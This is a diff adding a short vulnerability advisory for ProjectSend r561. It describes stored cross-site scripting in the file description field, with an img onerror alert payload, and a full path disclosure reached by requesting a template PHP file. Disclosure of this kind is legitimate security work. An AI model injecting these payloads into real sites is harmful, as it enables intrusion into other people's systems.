@@ -1,0 +1,47 @@
+               -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+                 INDEPENDENT SECURITY RESEARCHER 
+                   PENETRATION TESTING SECURITY
+               -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ 
+
+# Exploit Title: ProjectSend r561 - Cross Site Scripting & Full Path Disclosure Vulnerability's 
+# Date: 19/12/2014
+# Url Vendor: http://www.projectsend.org/
+# Vendor Name: ProjectSend 
+# Version: r561 Ultimate Version
+# CVE:  CVE-2014-1155
+# Author: TaurusOmar	
+# Tiwtte: @TaurusOmar_
+# Email:  taurusomar13@gmail.com
+# Home:  overhat.blogspot.com
+# Tested On: Bugtraq Optimus
+# Risk: Medium
+
+Description
+ProjectSend is a client-oriented file uploading utility. Clients are created and assigned a username and a password. Files can then be uploaded under each account with the ability to add a title and description to each.When a client logs in from any browser anywhere, the client will see a page that contains your company logo, and a sortable list of every file uploaded under the client's name, with description, time, date, etc.. It also works as a history of "sent" files, provides a differences between revisions, the time that it took between each revision, and so on.
+
+------------------------
++ CROSS SITE SCRIPTING + 
+------------------------
+# Exploiting Description - Get into code xss in the box of image description. 
+<textarea placeholder="Optionally, enter here a description for the file." name="file[1][description]">DESCRIPTION&lt;/textarea&gt;
+
+#P0c
+"><img src=x onerror=;;alert('XSS') />
+
+<textarea placeholder="Optionally, enter here a description for the file." name="file[1][description]">CODE XSS&lt;/textarea&gt;
+
+#Proof Concept
+http://i.imgur.com/FOPIvd4.jpg
+
+
+------------------------
++ FULL PATH DISCLOSURE +
+------------------------
+# Exploiting Description - The url disclosure directory of platform. 
+
+#P0c
+http://site.com/projectsend/templates/pinboxes/template.php
+
+#Proof Concept
+http://i.imgur.com/xfN4kDV.jpg
